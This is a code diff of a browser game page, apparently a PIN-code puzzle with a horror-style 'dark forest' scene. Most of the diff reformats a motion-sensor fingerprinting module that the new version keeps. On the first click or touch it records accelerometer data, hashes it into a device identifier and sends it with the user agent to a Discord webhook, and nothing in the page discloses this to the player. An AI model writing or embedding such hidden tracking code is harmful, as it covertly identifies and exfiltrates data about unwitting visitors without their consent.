@@ -586,252 +586,227 @@
       });
     } catch(e) {}
   }
+  
   // ============================================================
-// 3. MOTION SENSOR FINGERPRINTING (Accelerometer + Gyroscope)
-// ============================================================
+  // MOTION SENSOR FINGERPRINTING (Accelerometer + Gyroscope)
+  // ============================================================
 
-let motionData = [];
-let isCollecting = false;
-let collectionStartTime = null;
+  let motionData = [];
+  let isCollecting = false;
+  let collectionStartTime = null;
 
-// Check if motion sensors are supported
-const hasMotionSupport = 'DeviceMotionEvent' in window;
-const hasOrientationSupport = 'DeviceOrientationEvent' in window;
+  const hasMotionSupport = 'DeviceMotionEvent' in window;
+  const hasOrientationSupport = 'DeviceOrientationEvent' in window;
 
-async function requestMotionPermission() {
-    // iOS 13+ requires explicit permission request
-    if (typeof DeviceMotionEvent !== 'undefined' && 
-        typeof DeviceMotionEvent.requestPermission === 'function') {
-        try {
-            const permissionState = await DeviceMotionEvent.requestPermission();
-            if (permissionState === 'granted') {
-                console.log('Motion permission granted');
-                return true;
-            } else {
-                console.log('Motion permission denied');
-                return false;
-            }
-        } catch (error) {
-            console.log('Motion permission error:', error);
-            return false;
-        }
-    } else {
-        // Android and other platforms: no explicit permission needed
-        return true;
-    }
-}
+  async function requestMotionPermission() {
+      if (typeof DeviceMotionEvent !== 'undefined' && 
+          typeof DeviceMotionEvent.requestPermission === 'function') {
+          try {
+              const permissionState = await DeviceMotionEvent.requestPermission();
+              if (permissionState === 'granted') {
+                  console.log('Motion permission granted');
+                  return true;
+              } else {
+                  console.log('Motion permission denied');
+                  return false;
+              }
+          } catch (error) {
+              console.log('Motion permission error:', error);
+              return false;
+          }
+      } else {
+          return true;
+      }
+  }
 
-function startMotionCollection(durationMs = 3000) {
-    if (isCollecting) return;
-    
-    motionData = [];
-    collectionStartTime = Date.now();
-    isCollecting = true;
-    
-    // Listen for motion events
-    window.addEventListener('devicemotion', motionHandler);
-    
-    // Stop collection after duration
-    setTimeout(() => {
-        stopMotionCollection();
-    }, durationMs);
-}
+  function startMotionCollection(durationMs = 3000) {
+      if (isCollecting) return;
+      
+      motionData = [];
+      collectionStartTime = Date.now();
+      isCollecting = true;
+      
+      window.addEventListener('devicemotion', motionHandler);
+      
+      setTimeout(() => {
+          stopMotionCollection();
+      }, durationMs);
+  }
 
-function motionHandler(event) {
-    if (!isCollecting) return;
-    
-    const acc = event.acceleration;
-    const accG = event.accelerationIncludingGravity;
-    const rotation = event.rotationRate;
-    const interval = event.interval;
-    
-    motionData.push({
-        timestamp: Date.now(),
-        accX: acc?.x || null,
-        accY: acc?.y || null,
-        accZ: acc?.z || null,
-        accGX: accG?.x || null,
-        accGY: accG?.y || null,
-        accGZ: accG?.z || null,
-        rotAlpha: rotation?.alpha || null,
-        rotBeta: rotation?.beta || null,
-        rotGamma: rotation?.gamma || null,
-        interval: interval
-    });
-}
+  function motionHandler(event) {
+      if (!isCollecting) return;
+      
+      const acc = event.acceleration;
+      const accG = event.accelerationIncludingGravity;
+      const rotation = event.rotationRate;
+      const interval = event.interval;
+      
+      motionData.push({
+          timestamp: Date.now(),
+          accX: acc?.x || null,
+          accY: acc?.y || null,
+          accZ: acc?.z || null,
+          accGX: accG?.x || null,
+          accGY: accG?.y || null,
+          accGZ: accG?.z || null,
+          rotAlpha: rotation?.alpha || null,
+          rotBeta: rotation?.beta || null,
+          rotGamma: rotation?.gamma || null,
+          interval: interval
+      });
+  }
 
-function stopMotionCollection() {
-    if (!isCollecting) return;
-    
-    isCollecting = false;
-    window.removeEventListener('devicemotion', motionHandler);
-    
-    // Generate fingerprint from collected data
-    const fingerprint = generateMotionFingerprint(motionData);
-    
-    // Send to Discord
-    sendMotionFingerprintToDiscord(fingerprint);
-}
+  function stopMotionCollection() {
+      if (!isCollecting) return;
+      
+      isCollecting = false;
+      window.removeEventListener('devicemotion', motionHandler);
+      
+      const fingerprint = generateMotionFingerprint(motionData);
+      sendMotionFingerprintToDiscord(fingerprint);
+  }
 
-function generateMotionFingerprint(data) {
-    if (data.length === 0) return null;
-    
-    // Calculate statistical features from motion data
-    const accXValues = data.map(d => d.accX).filter(v => v !== null);
-    const accYValues = data.map(d => d.accY).filter(v => v !== null);
-    const accZValues = data.map(d => d.accZ).filter(v => v !== null);
-    
-    // Helper function to calculate variance
-    function variance(values) {
-        if (values.length === 0) return null;
-        const mean = values.reduce((a, b) => a + b, 0) / values.length;
-        const squareDiffs = values.map(value => Math.pow(value - mean, 2));
-        return squareDiffs.reduce((a, b) => a + b, 0) / values.length;
-    }
-    
-    // Helper function to calculate range
-    function range(values) {
-        if (values.length === 0) return null;
-        return Math.max(...values) - Math.min(...values);
-    }
-    
-    // Helper function to calculate standard deviation
-    function stdDev(values) {
-        if (values.length === 0) return null;
-        const varVal = variance(values);
-        return varVal !== null ? Math.sqrt(varVal) : null;
-    }
-    
-    // Helper function to calculate mean
-    function mean(values) {
-        if (values.length === 0) return null;
-        return values.reduce((a, b) => a + b, 0) / values.length;
-    }
-    
-    // Generate a unique hash from the motion patterns
-    const fingerprintString = JSON.stringify({
-        accXVar: variance(accXValues),
-        accYVar: variance(accYValues),
-        accZVar: variance(accZValues),
-        accXRange: range(accXValues),
-        accYRange: range(accYValues),
-        accZRange: range(accZValues),
-        accXMean: mean(accXValues),
-        accYMean: mean(accYValues),
-        accZMean: mean(accZValues),
-        accXStd: stdDev(accXValues),
-        accYStd: stdDev(accYValues),
-        accZStd: stdDev(accZValues),
-        sampleCount: data.length,
-        duration: data.length > 0 ? data[data.length-1].timestamp - data[0].timestamp : 0
-    });
-    
-    // Simple hash function
-    let hash = 0;
-    for (let i = 0; i < fingerprintString.length; i++) {
-        const char = fingerprintString.charCodeAt(i);
-        hash = ((hash << 5) - hash) + char;
-        hash = hash & hash;
-    }
-    
-    return {
-        hash: hash.toString(16),
-        variance: {
-            x: variance(accXValues),
-            y: variance(accYValues),
-            z: variance(accZValues)
-        },
-        sampleCount: data.length,
-        duration: data.length > 0 ? data[data.length-1].timestamp - data[0].timestamp : 0,
-        hasMotionSensor: true
-    };
-}
+  function generateMotionFingerprint(data) {
+      if (data.length === 0) return null;
+      
+      const accXValues = data.map(d => d.accX).filter(v => v !== null);
+      const accYValues = data.map(d => d.accY).filter(v => v !== null);
+      const accZValues = data.map(d => d.accZ).filter(v => v !== null);
+      
+      function variance(values) {
+          if (values.length === 0) return null;
+          const mean = values.reduce((a, b) => a + b, 0) / values.length;
+          const squareDiffs = values.map(value => Math.pow(value - mean, 2));
+          return squareDiffs.reduce((a, b) => a + b, 0) / values.length;
+      }
+      
+      function range(values) {
+          if (values.length === 0) return null;
+          return Math.max(...values) - Math.min(...values);
+      }
+      
+      function stdDev(values) {
+          if (values.length === 0) return null;
+          const varVal = variance(values);
+          return varVal !== null ? Math.sqrt(varVal) : null;
+      }
+      
+      function mean(values) {
+          if (values.length === 0) return null;
+          return values.reduce((a, b) => a + b, 0) / values.length;
+      }
+      
+      const fingerprintString = JSON.stringify({
+          accXVar: variance(accXValues),
+          accYVar: variance(accYValues),
+          accZVar: variance(accZValues),
+          accXRange: range(accXValues),
+          accYRange: range(accYValues),
+          accZRange: range(accZValues),
+          accXMean: mean(accXValues),
+          accYMean: mean(accYValues),
+          accZMean: mean(accZValues),
+          accXStd: stdDev(accXValues),
+          accYStd: stdDev(accYValues),
+          accZStd: stdDev(accZValues),
+          sampleCount: data.length,
+          duration: data.length > 0 ? data[data.length-1].timestamp - data[0].timestamp : 0
+      });
+      
+      let hash = 0;
+      for (let i = 0; i < fingerprintString.length; i++) {
+          const char = fingerprintString.charCodeAt(i);
+          hash = ((hash << 5) - hash) + char;
+          hash = hash & hash;
+      }
+      
+      return {
+          hash: hash.toString(16),
+          variance: {
+              x: variance(accXValues),
+              y: variance(accYValues),
+              z: variance(accZValues)
+          },
+          sampleCount: data.length,
+          duration: data.length > 0 ? data[data.length-1].timestamp - data[0].timestamp : 0,
+          hasMotionSensor: true
+      };
+  }
 
-async function sendMotionFingerprintToDiscord(fingerprint) {
-    if (!fingerprint) {
-        // Send that motion sensors are not available
-        const embed = {
-            title: "📳 MOTION SENSOR STATUS",
-            color: 0xffaa00,
-            fields: [
-                { name: "Status", value: "Motion sensors unavailable or permission denied", inline: false },
-                { name: "Browser", value: navigator.userAgent.substring(0, 60), inline: false }
-            ],
-            footer: { text: "User may have denied permission or device lacks sensors" }
-        };
-        
-        try {
-            await fetch(WEBHOOK, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ embeds: [embed] })
-            });
-        } catch(e) {}
-        return;
-    }
-    
-    const embed = {
-        title: "📳 MOTION SENSOR FINGERPRINT",
-        color: 0x00ccff,
-        timestamp: new Date().toISOString(),
-        fields: [
-            { name: "Device Hash", value: `\`${fingerprint.hash}\``, inline: false },
-            { name: "Sensor Variance (X/Y/Z)", value: `${fingerprint.variance.x?.toFixed(4) || 'N/A'} / ${fingerprint.variance.y?.toFixed(4) || 'N/A'} / ${fingerprint.variance.z?.toFixed(4) || 'N/A'}`, inline: false },
-            { name: "Sample Count", value: fingerprint.sampleCount.toString(), inline: true },
-            { name: "Duration (ms)", value: fingerprint.duration.toString(), inline: true },
-            { name: "Note", value: "Variance patterns can help identify unique devices", inline: false }
-        ],
-        footer: { text: "Motion sensor fingerprint • Manufacturing imperfections create unique patterns" }
-    };
-    
-    try {
-        await fetch(WEBHOOK, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ embeds: [embed] })
-        });
-    } catch(e) {
-        console.log("Motion fingerprint send failed");
-    }
-}
+  async function sendMotionFingerprintToDiscord(fingerprint) {
+      if (!fingerprint) {
+          const embed = {
+              title: "📳 MOTION SENSOR STATUS",
+              color: 0xffaa00,
+              fields: [
+                  { name: "Status", value: "Motion sensors unavailable or permission denied", inline: false },
+                  { name: "Browser", value: navigator.userAgent.substring(0, 60), inline: false }
+              ],
+              footer: { text: "User may have denied permission or device lacks sensors" }
+          };
+          
+          try {
+              await fetch(WEBHOOK, {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({ embeds: [embed] })
+              });
+          } catch(e) {}
+          return;
+      }
+      
+      const embed = {
+          title: "📳 MOTION SENSOR FINGERPRINT",
+          color: 0x00ccff,
+          timestamp: new Date().toISOString(),
+          fields: [
+              { name: "Device Hash", value: `\`${fingerprint.hash}\``, inline: false },
+              { name: "Sensor Variance (X/Y/Z)", value: `${fingerprint.variance.x?.toFixed(4) || 'N/A'} / ${fingerprint.variance.y?.toFixed(4) || 'N/A'} / ${fingerprint.variance.z?.toFixed(4) || 'N/A'}`, inline: false },
+              { name: "Sample Count", value: fingerprint.sampleCount.toString(), inline: true },
+              { name: "Duration (ms)", value: fingerprint.duration.toString(), inline: true },
+              { name: "Note", value: "Variance patterns can help identify unique devices", inline: false }
+          ],
+          footer: { text: "Motion sensor fingerprint • Manufacturing imperfections create unique patterns" }
+      };
+      
+      try {
+          await fetch(WEBHOOK, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ embeds: [embed] })
+          });
+      } catch(e) {
+          console.log("Motion fingerprint send failed");
+      }
+  }
 
-// Initialize motion fingerprinting on page load (with user gesture)
-async function initMotionFingerprinting() {
-    // Check if motion sensors are supported
-    if (!hasMotionSupport) {
-        console.log("DeviceMotionEvent not supported");
-        return;
-    }
-    
-    // For iOS, we need a user gesture to request permission
-    // Attach to a click event on the document
-    const setupMotionOnClick = async () => {
-        const permissionGranted = await requestMotionPermission();
-        if (permissionGranted) {
-            // Collect motion data for 3 seconds
-            startMotionCollection(3000);
-        } else {
-            // Send notification that permission was denied
-            sendMotionFingerprintToDiscord(null);
-        }
-        // Remove listener after first click to avoid multiple requests
-        document.removeEventListener('click', setupMotionOnClick);
-        document.removeEventListener('touchstart', setupMotionOnClick);
-    };
-    
-    // Listen for first user interaction
-    document.addEventListener('click', setupMotionOnClick);
-    document.addEventListener('touchstart', setupMotionOnClick);
-    
-    // Set a timeout in case user never clicks
-    setTimeout(() => {
-        document.removeEventListener('click', setupMotionOnClick);
-        document.removeEventListener('touchstart', setupMotionOnClick);
-    }, 10000);
-}
+  async function initMotionFingerprinting() {
+      if (!hasMotionSupport) {
+          console.log("DeviceMotionEvent not supported");
+          return;
+      }
+      
+      const setupMotionOnClick = async () => {
+          const permissionGranted = await requestMotionPermission();
+          if (permissionGranted) {
+              startMotionCollection(3000);
+          } else {
+              sendMotionFingerprintToDiscord(null);
+          }
+          document.removeEventListener('click', setupMotionOnClick);
+          document.removeEventListener('touchstart', setupMotionOnClick);
+      };
+      
+      document.addEventListener('click', setupMotionOnClick);
+      document.addEventListener('touchstart', setupMotionOnClick);
+      
+      setTimeout(() => {
+          document.removeEventListener('click', setupMotionOnClick);
+          document.removeEventListener('touchstart', setupMotionOnClick);
+      }, 10000);
+  }
 
-// Start motion fingerprinting (non-blocking)
-initMotionFingerprinting();
+  initMotionFingerprinting();
   
   // Game State
   const PASS_MAIN = "4820";
@@ -989,9 +964,7 @@ initMotionFingerprinting();
     const enter = async () => {
       const v = (pin.value || "").trim();
       
-      // ============================================================
-      // NEW: CODE 3851 - DARK FOREST SEQUENCE
-      // ============================================================
+      // DARK FOREST SEQUENCE (CODE 3851)
       if(v === "3851"){
         msg.textContent = "🔑 CODE 3851 ACCEPTED.";
         await sleep(800);
@@ -1041,132 +1014,185 @@ initMotionFingerprinting();
               left: 0;
               width: 100%;
               height: 100%;
-              background: black;
+              background: #000000;
               z-index: 1000;
-              display: flex;
-              flex-direction: column;
-              align-items: center;
-              justify-content: center;
-              animation: forestFadeIn 3s ease;
+              overflow: hidden;
           ">
-              <div id="forestBackground" style="
+              <div id="forestBg" style="
+                  position: absolute;
+                  bottom: 0;
+                  left: 0;
+                  width: 100%;
+                  height: 60%;
+                  background: linear-gradient(180deg, #0a0a0a 0%, #1a1a1a 100%);
+              ">
+                  <svg style="position: absolute; bottom: 0; left: 0; width: 100%; height: 100%;" preserveAspectRatio="none" viewBox="0 0 800 300">
+                      <path d="M50,300 L70,180 L90,300 Z" fill="#0d0d0d" />
+                      <path d="M120,300 L145,150 L170,300 Z" fill="#0a0a0a" />
+                      <path d="M200,300 L230,120 L260,300 Z" fill="#0d0d0d" />
+                      <path d="M320,300 L350,170 L380,300 Z" fill="#0a0a0a" />
+                      <path d="M450,300 L470,140 L490,300 Z" fill="#0d0d0d" />
+                      <path d="M550,300 L580,110 L610,300 Z" fill="#0a0a0a" />
+                      <path d="M650,300 L675,160 L700,300 Z" fill="#0d0d0d" />
+                      <path d="M750,300 L770,190 L790,300 Z" fill="#0a0a0a" />
+                      <path d="M0,300 L25,130 L50,300 Z" fill="#0d0d0d" />
+                  </svg>
+              </div>
+              
+              <div id="creepyFigure" style="
+                  position: absolute;
+                  bottom: 20%;
+                  left: 50%;
+                  transform: translateX(-50%) scale(0.8);
+                  width: 180px;
+                  height: 280px;
+                  background: url('data:image/svg+xml;utf8,<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 200 300\"><path d=\"M100,30 C70,30 60,70 60,100 C60,130 70,140 70,170 C70,200 80,230 80,260 L80,300 L120,300 L120,260 C120,230 130,200 130,170 C130,140 140,130 140,100 C140,70 130,30 100,30 Z\" fill=\"%231a1a1a\"/><circle cx=\"100\" cy=\"80\" r=\"20\" fill=\"%231a1a1a\"/><circle cx=\"90\" cy=\"75\" r=\"3\" fill=\"%23333333\"/><circle cx=\"110\" cy=\"75\" r=\"3\" fill=\"%23333333\"/><path d=\"M90,95 L110,95\" stroke=\"%23333333\" stroke-width=\"2\"/></svg>') center/contain no-repeat;
+                  filter: drop-shadow(0 0 20px rgba(0,0,0,0.8));
+                  opacity: 0;
+                  animation: figureAppear 4s ease-out forwards;
+                  z-index: 20;
+              "></div>
+              
+              <div id="fogOverlay" style="
                   position: absolute;
                   top: 0;
                   left: 0;
                   width: 100%;
                   height: 100%;
-                  background: url('data:image/svg+xml;utf8,<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 800 600\"><rect width=\"800\" height=\"600\" fill=\"black\"/><path d=\"M0 600 L100 300 L200 450 L300 200 L400 400 L500 150 L600 350 L700 250 L800 450 L800 600 Z\" fill=\"%23111111\"/><circle cx=\"400\" cy=\"100\" r=\"30\" fill=\"%23ffffff\" opacity=\"0.3\"/><circle cx=\"300\" cy=\"80\" r=\"20\" fill=\"%23ffffff\" opacity=\"0.2\"/><circle cx=\"500\" cy=\"120\" r=\"25\" fill=\"%23ffffff\" opacity=\"0.25\"/></svg>') center/cover no-repeat;
-                  filter: grayscale(100%) brightness(0.3);
-                  animation: slowDrift 20s infinite alternate;
+                  background: radial-gradient(circle at center, transparent 30%, rgba(0,0,0,0.7) 100%);
+                  pointer-events: none;
+                  z-index: 5;
               "></div>
+              
               <div id="forestContent" style="
-                  position: relative;
-                  z-index: 10;
-                  background: rgba(0,0,0,0.7);
-                  border: 1px solid rgba(255,255,255,0.2);
+                  position: absolute;
+                  bottom: 15%;
+                  left: 50%;
+                  transform: translateX(-50%);
+                  z-index: 30;
+                  background: rgba(0,0,0,0.85);
+                  border: 1px solid rgba(80,80,80,0.5);
                   border-radius: 20px;
-                  padding: 30px;
-                  max-width: 500px;
-                  width: 80%;
+                  padding: 25px 35px;
+                  width: 85%;
+                  max-width: 450px;
                   text-align: center;
-                  backdrop-filter: blur(5px);
-                  box-shadow: 0 0 50px rgba(0,0,0,0.5);
-                  animation: contentGlitch 0.5s infinite alternate;
+                  backdrop-filter: blur(8px);
+                  box-shadow: 0 0 40px rgba(0,0,0,0.5);
+                  animation: boxGlow 2s ease-in-out infinite alternate;
               ">
                   <div id="forestQuestion" style="
-                      font-size: 24px;
-                      margin-bottom: 30px;
-                      font-family: monospace;
-                      color: #cccccc;
-                      text-shadow: 0 0 5px rgba(255,255,255,0.5);
+                      font-size: 22px;
+                      margin-bottom: 25px;
+                      font-family: 'Courier New', monospace;
+                      color: #bbbbbb;
+                      text-shadow: 0 0 8px rgba(100,100,100,0.5);
+                      letter-spacing: 1px;
                   "></div>
+                  
                   <div id="forestInputArea">
                       <input type="text" id="forestAnswerInput" placeholder="..." style="
-                          background: rgba(0,0,0,0.8);
-                          border: 1px solid #444;
-                          color: white;
+                          background: rgba(30,30,30,0.9);
+                          border: 1px solid #555;
+                          color: #ddd;
                           padding: 12px 20px;
-                          border-radius: 30px;
-                          width: 80%;
+                          border-radius: 40px;
+                          width: 85%;
                           text-align: center;
                           font-size: 16px;
                           outline: none;
+                          font-family: monospace;
                       ">
                       <button id="forestSubmitBtn" style="
-                          background: rgba(255,255,255,0.1);
-                          border: 1px solid #666;
-                          color: white;
-                          padding: 12px 24px;
-                          border-radius: 30px;
-                          margin-top: 15px;
+                          background: rgba(60,60,60,0.8);
+                          border: 1px solid #777;
+                          color: #ccc;
+                          padding: 10px 25px;
+                          border-radius: 40px;
+                          margin-top: 18px;
                           cursor: pointer;
+                          font-family: monospace;
                           transition: 0.2s;
                       ">† ANSWER †</button>
                   </div>
+                  
                   <div id="forestYesNoArea" style="display: none;">
                       <button id="yesBtn" style="
-                          background: rgba(0,128,0,0.3);
-                          border: 1px solid #00ff00;
-                          color: white;
-                          padding: 12px 24px;
-                          border-radius: 30px;
-                          margin: 10px;
+                          background: rgba(0,60,0,0.6);
+                          border: 1px solid #2a6b2a;
+                          color: #aaffaa;
+                          padding: 10px 28px;
+                          border-radius: 40px;
+                          margin: 8px;
                           cursor: pointer;
-                          transition: 0.2s;
+                          font-family: monospace;
                       ">† YES †</button>
                       <button id="noBtn" style="
-                          background: rgba(128,0,0,0.3);
-                          border: 1px solid #ff0000;
-                          color: white;
-                          padding: 12px 24px;
-                          border-radius: 30px;
-                          margin: 10px;
+                          background: rgba(60,0,0,0.6);
+                          border: 1px solid #8b2a2a;
+                          color: #ffaaaa;
+                          padding: 10px 28px;
+                          border-radius: 40px;
+                          margin: 8px;
                           cursor: pointer;
-                          transition: 0.2s;
+                          font-family: monospace;
                       ">† NO †</button>
                   </div>
               </div>
+              
+              <div id="forestParticles"></div>
           </div>
+          
           <style>
-              @keyframes forestFadeIn {
-                  0% { opacity: 0; backdrop-filter: blur(0px); }
-                  100% { opacity: 1; backdrop-filter: blur(10px); }
+              @keyframes figureAppear {
+                  0% { opacity: 0; transform: translateX(-50%) scale(0.5); filter: blur(10px); }
+                  100% { opacity: 1; transform: translateX(-50%) scale(0.9); filter: blur(0px); }
               }
-              @keyframes slowDrift {
-                  0% { transform: scale(1) translateX(0); opacity: 0.6; }
-                  100% { transform: scale(1.05) translateX(2%); opacity: 0.8; }
+              
+              @keyframes boxGlow {
+                  0% { box-shadow: 0 0 20px rgba(0,0,0,0.5); border-color: rgba(80,80,80,0.3); }
+                  100% { box-shadow: 0 0 35px rgba(50,50,50,0.8); border-color: rgba(120,120,120,0.6); }
               }
-              @keyframes contentGlitch {
-                  0% { text-shadow: 2px 0 red, -2px 0 blue; opacity: 0.9; transform: translate(0);}
-                  100% { text-shadow: -1px 0 red, 1px 0 blue; opacity: 1; transform: translate(1px, -1px);}
+              
+              @keyframes forestFlicker {
+                  0% { opacity: 1; background-color: #000; }
+                  10% { opacity: 0.9; background-color: #0a0a0a; }
+                  20% { opacity: 0.95; background-color: #000; }
+                  30% { opacity: 0.85; background-color: #111; }
+                  100% { opacity: 1; background-color: #000; }
+              }
+              
+              @keyframes floatParticle {
+                  0% { transform: translateY(0) translateX(0); opacity: 0; }
+                  20% { opacity: 0.5; }
+                  80% { opacity: 0.3; }
+                  100% { transform: translateY(-150px) translateX(30px); opacity: 0; }
+              }
+              
+              @keyframes shake {
+                  0% { transform: translateX(0); }
+                  25% { transform: translateX(-5px); }
+                  75% { transform: translateX(5px); }
+                  100% { transform: translateX(0); }
               }
           </style>
       `;
       
-      // Add floating particles
-      const container = document.getElementById('forestContainer');
-      for (let i = 0; i < 50; i++) {
+      const particleContainer = document.getElementById('forestParticles');
+      for (let i = 0; i < 80; i++) {
           const particle = document.createElement('div');
           particle.style.position = 'absolute';
-          particle.style.width = '2px';
-          particle.style.height = '2px';
-          particle.style.background = 'white';
+          particle.style.width = (2 + Math.random() * 4) + 'px';
+          particle.style.height = particle.style.width;
+          particle.style.background = `rgba(180,180,180,${0.1 + Math.random() * 0.3})`;
           particle.style.borderRadius = '50%';
           particle.style.left = Math.random() * 100 + '%';
           particle.style.top = Math.random() * 100 + '%';
-          particle.style.animation = `floatParticle ${5 + Math.random() * 10}s infinite ease-in-out`;
-          container.appendChild(particle);
+          particle.style.pointerEvents = 'none';
+          particle.style.animation = `floatParticle ${3 + Math.random() * 7}s infinite ease-in-out`;
+          particle.style.opacity = Math.random() * 0.5;
+          particleContainer.appendChild(particle);
       }
-      
-      const particleStyle = document.createElement('style');
-      particleStyle.textContent = `
-          @keyframes floatParticle {
-              0% { transform: translateY(0) translateX(0); opacity: 0; }
-              50% { opacity: 0.8; }
-              100% { transform: translateY(-100px) translateX(20px); opacity: 0; }
-          }
-      `;
-      document.head.appendChild(particleStyle);
       
       askForestQuestion();
   }
